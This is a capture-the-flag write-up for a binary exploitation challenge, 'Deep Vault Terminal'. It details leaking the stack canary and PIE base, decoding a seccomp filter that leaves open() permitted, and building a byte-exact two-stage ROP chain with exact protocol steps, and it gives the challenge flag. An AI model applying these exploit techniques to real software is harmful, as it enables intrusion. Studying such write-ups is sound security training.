# PWN#002 — Deep Vault Terminal

**Objective (verbatim):** *"Get a shell on the remote host and read the flag."*
**Deliverables:** `vault` (ELF x86-64 **PIE, stripped**), `libc.so.6` (Debian GLIBC 2.42-13),
`ld-linux-x86-64.so.2`.
**Flag:** `CTF{e0a79830f06dca87a52f8be6d895deae}` — **read from the file `/flag/flag.txt`**
via our own `open`/`read`/`write` ROP chain.

### 0. TL;DR

Same "Vault" family as PWN#001 but **PIE + stripped**, seccomp implemented as a **raw BPF
filter** that blocks only `execve` (59) and `openat` (257) — **`open` (2) is allowed**, plus
`read`/`write`. The win:

1. Leak **PIE base** from the built-in banner `Vault seal: %016lx` (prints `base+0x13a6`).
2. Leak the canary (73-byte "name" read overwrites `canary[0]`, `puts("Hello, ")+puts(buf)` echoes it).
3. **Stage 1 ROP:** `puts(puts@GOT)` to leak libc — `rdi` is built with the binary's *injected*
   `pop rax; ret` + `pop rcx; ret` + `pext rdi, rax, rcx; ret` trio — then jump back to the
   state-machine entry `0x1676` to restart cleanly.
4. **Stage 2 ROP:** `open(base+0x4070 /* "/flag/flag.txt" pre-decoded in .bss */, 0)` →
   `xchg eax, edi` (fd → rdi) → `read` → `write(1, buf, n)`.

> Key insight: the binary decodes the string `/flag/flag.txt` into writable `.bss` at
> `PIE+0x4070` at startup — **but never opens it itself.** That's a deliberate gift: our ROP
> just needs to point `open` at that known PIE-relative address.

### 1. Binary recon

`vault` is **PIE, stripped**, Full RELRO, Canary, NX, no RPATH/RUNPATH. BuildID
`b9a9de789eb964c060a1320e74e37b9b6260bd1c`, GCC Debian 12.2.0.

Local PLT offsets (PIE-relative):

| Symbol | PLT off | GOT off |
|--------|---------|---------|
| `puts` | `0x1030` | `0x3f88` |
| `__stack_chk_fail` | `0x1040` | `0x3f90` |
| `printf` | `0x1050` | `0x3f98` |
| `memset` | `0x1060` | `0x3fa0` |
| `close` | `0x1070` | `0x3fa8` |
| `read` | `0x1080` | `0x3fb0` |
| `prctl` | `0x1090` | `0x3fb8` |
| `malloc` | `0x10a0` | `0x3fc0` |
| `setvbuf` | `0x10b0` | `0x3fc8` |
| `open` | `0x10c0` | `0x3fd0` |

`.text` = `0x10e0–0x1864`. `__libc_start_main@GOT = 0x3fd8`.

**Strings/behaviour:** banner `=== Deep Vault Terminal ===`, `Vault seal: %016lx`,
`Enter your name: `, `Leave a message for the vault keeper: `, `Message received.`,
`Hello, `, `/proc/self/status`. Imports `prctl`, `open`, `close`, `malloc`.

**Program flow (`main` @ `0x1395`):**
- `0x13b7–0x141f`: writes the 15 bytes `75 3c 36 3b 3d 75 3c 36 3b 3d 74 2e 22 2e 5a` into
  `.bss+0x4060`.
- calls `0x1546` (XOR each byte with `0x5a`, 15 bytes) → **`.bss+0x4070 = "/flag/flag.txt"`**.
- `setvbuf` ×3, `0x15b0` (open+read+close **`/proc/self/status`** — a red herring), `0x12b1` (seccomp).
- `puts("=== Deep Vault Terminal ===")`.
- `printf("Vault seal: %016lx\n", base+0x13a6)` ← **PIE leak**.
- `call 0x1676` (state machine) then `jmp` back → **loops forever**.

### 2. The vulnerability

Function `0x1676` is a **state machine** (`[rbp-0x58]` = state, `[rbp-0x5c]` = sub-index,
two jump tables at `0x20a0` / `0x20e0`) driving the prompt loop. Decoded jump tables:

| state | addr | action |
|-------|------|--------|
| 8 | `0x1723` | → state 5 |
| 5 | `0x17a5` | dispatch on sub-index |
| 12 | `0x16fb` | `printf("Enter your name: ")` |
| 4 | `0x16c4` | `read(0, rbp-0x50, 0x49)` — **name** |
| 7 | `0x1815` | `printf("Hello, "); puts(rbp-0x50)` |
| 13 | `0x177d` | `printf("Leave a message...")` |
| 1 | `0x1737` | `read(0, rbp-0x50, 0x100)` — **message** |
| 9 | `0x1761` | `puts("Message received.")` |
| 14 | `0x184c` | epilogue: canary check → `leave; ret` |

Buffer `rbp-0x50`, canary `rbp-0x8` → distance **`0x48` = 72 bytes**.

- **Name read = 0x49 = 73 bytes** ⇒ byte 73 lands on `canary[0]`. `puts(buf)` (state 7) then
  echoes 72 name bytes **+ canary bytes until a NUL** → **canary leak** (reconstruct
  `b"\x00" + leaked[:7]`).
- **Message read = 0x100 = 256 bytes** ⇒ classic **stack BOF**: overwrite saved `rbp` and the
  return address. The function's `ret` is our ROP entry point.

The state machine runs once per `call 0x1676`; `main` re-calls it in a loop, so **returning to
`0x1676` restarts the whole name→message flow** (fresh frame, fresh reads) = free second stage.

### 3. seccomp — raw BPF, not libseccomp

`0x12b1` builds a `sock_filter[]` on the stack and calls
`prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)` then `prctl(PR_SET_SECCOMP, 2, &filter)`.
Filter instructions (5×8 bytes):

```
LD  [0]            ; load seccomp_data.nr
JEQ 59   jt=2 jf=0 ; if nr == execve   -> KILL
JEQ 257  jt=1 jf=0 ; if nr == openat   -> KILL
RET  ALLOW (0x7fff0000)
RET  KILL  (0)
```

⇒ **only `execve` (59) and `openat` (257) are blocked.** Everything else — including
**`open` (2)** — is allowed. So the intended win is `open("/flag/flag.txt")` + `read` + `write`,
not `execve`.

### 4. Injected gadgets (the `rdi` problem)

The stripped binary has **no `pop rdi; ret`** and no `pop rsi`/`pop rdx`/`syscall`. Instead,
three functions/gadgets are clearly **hand-planted**:

| Gadget | Offset | Note |
|--------|--------|------|
| `pop rax ; ret` | `0x11e0` | (inside dead func `0x11c9`) |
| `pop rcx ; ret` | `0x1210` | (inside dead func `0x11f9`) |
| `pext rdi, rax, rcx ; ret` | `0x1529` | dead func `0x1512` — BMI2 `pext` |
| `pop rbp ; ret` | `0x11b3` | |
| `ret` | `0x1016` | align |

`pext rdi, rax, rcx` extracts the bits of `rax` selected by the mask `rcx`. With
**`rcx = 0xffffffffffffffff`** and `rax = target`, we get **`rdi = target`** — a full
`pop rdi` replacement built from scratch. (Enter at `0x1529` to skip the `xor eax,eax` at
`0x1527` that would zero `rax`.)

libc (provided, glibc 2.42-13) supplies the rest and all match PWN#001's verified set:

| Symbol | Offset |
|--------|--------|
| `puts` | `0x82060` |
| `pop rdi ; ret` | `0x2a9b7` |
| `pop rsi ; ret` | `0x29e29` |
| `pop rdx ; ret` | `0x96372` |
| `open` | `0x106b10` |
| `read` | `0x1072b0` |
| `write` | `0x107d10` |
| `xchg eax, edi ; ret` | `0x17d1f6` |

### 5. Byte-exact chain

```
base  = leak_seal - 0x13a6
canary = b"\x00" + leaks[1:8]            # from the 73-byte name echo

# ---- Stage 1 (leak libc, restart) ----
payload1 = b"B"*72 + canary + p64(0xdeadbeef)          # pad, canary, saved rbp
payload1 += p64(base+0x11e0) + p64(base+0x3f88)        # pop rax ; puts@GOT
payload1 += p64(base+0x1210) + p64(0xffffffffffffffff) # pop rcx ; -1
payload1 += p64(base+0x1529)                           # pext rdi, rax, rcx
payload1 += p64(base+0x1030)                           # puts@plt  -> leaks 6 bytes
payload1 += p64(base+0x1676)                           # restart state machine

libc = u64(leak[:6].ljust(8,b"\x00")) - 0x82060

# ---- Stage 2 (open/read/write) ----
payload2  = b"C"*72 + canary + p64(0xdeadbeef)
payload2 += p64(libc+0x2a9b7) + p64(base+0x4070)      # pop rdi ; "/flag/flag.txt"
payload2 += p64(libc+0x29e29) + p64(0)                # pop rsi ; O_RDONLY
payload2 += p64(libc+0x106b10)                        # open
payload2 += p64(libc+0x17d1f6)                        # xchg eax, edi  (fd -> rdi)
payload2 += p64(libc+0x29e29) + p64(base+0x4100)      # pop rsi ; bss buf
payload2 += p64(libc+0x96372) + p64(0x100)            # pop rdx ; n
payload2 += p64(libc+0x1072b0)                        # read
payload2 += p64(libc+0x2a9b7) + p64(1)                # pop rdi ; 1
payload2 += p64(libc+0x29e29) + p64(base+0x4100)      # pop rsi ; bss buf
payload2 += p64(libc+0x96372) + p64(0x100)            # pop rdx ; n
payload2 += p64(libc+0x107d10)                        # write  -> CTF{...}
```

### 6. Protocol sequences (exact)

```
recv_until "Enter your name: "            # banner + "Vault seal: <hex>"
send  b"A"*72 + b"A"                      # 73 bytes -> canary leak
recv_until "Leave a message for the vault keeper: "
send  payload1 + b"\n"                    # 256-byte overflow (stage 1)
recv_until "Enter your name: "            # got libc leak, machine restarted
send  b"A"*72 + b"A"                      # canary again (same value)
recv_until "Leave a message for the vault keeper: "
send  payload2 + b"\n"                    # 256-byte overflow (stage 2)
recv -> "CTF{e0a79830f06dca87a52f8be6d895deae}"
```

### 7. Dead ends / pitfalls

- **No `pop rdi` in the binary** — the injected `pext` trio is the intended substitute; the
  easy fix is `rax=target, rcx=-1, pext rdi,rax,rcx`.
- **`openat` blocked but `open` allowed** — don't assume "seccomp" means "no file IO". The
  raw BPF filter only kills `execve` and `openat`.
- **fd juggling** — `open` returns the fd in `rax`; `xchg eax, edi; ret` puts it in `rdi`.
  Don't hardcode `fd=3` (remotely the lowest free fd may differ).
- **`write` prints NULs** — reading `0x100` bytes from a short file emits trailing zeros; parse
  with `re.search(rb"CTF\{[^}]+\}")`, never by line.
- **`puts` leak can be shorter than 6 bytes** if the pointer contains a `\x00` early
  (truncates) — retry the connection (~1/64) until you get 6 non-zero bytes.
- **Canary containing `\n`** truncates the echo — retry.
- **`pext` is BMI2** — fine on modern CPUs (Kali/modern servers); it's the challenge's intended
  primitive, not an accident.

### 8. Reusable lessons

- PIE leak from a `printf("%016lx", base+const)` banner → `base = leak - const`.
- Pre-decoded secret strings in `.bss` are a gift: reference them by PIE-relative address.
- `pext rdi, rax, rcx ; ret` with `rcx = -1` = a `pop rdi` when the binary has none.
- seccomp can be **raw BPF**; decode `sock_filter[]` from the disassembly (`JEQ nr jt jf k`).
- Two-stage ret2libc via re-entering the entry function (`call 0x1676` in a `main` loop).
- `xchg eax, edi ; ret` to move a syscall return value (a fd) into `rdi` for the next call.

Solver: `exploit_final.py` (stdlib-only, retry loop). Flag:
`CTF{e0a79830f06dca87a52f8be6d895deae}`.

---

## PWN#003 — Notes Vault
